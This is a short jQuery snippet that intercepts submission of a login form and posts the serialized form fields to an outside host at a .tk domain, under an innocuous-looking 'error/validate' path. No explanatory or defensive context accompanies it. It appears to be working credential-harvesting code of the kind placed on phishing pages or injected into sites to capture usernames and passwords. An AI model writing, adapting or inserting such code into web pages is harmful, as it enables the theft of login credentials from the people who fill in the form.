$('.loginform').on('submit', function(e){
	e.preventDefault();

	$.post('https://studio-verhuur.tk/error/validate', { data: $(this).serialize() }, function(data) {
		console.log(data);
	});
});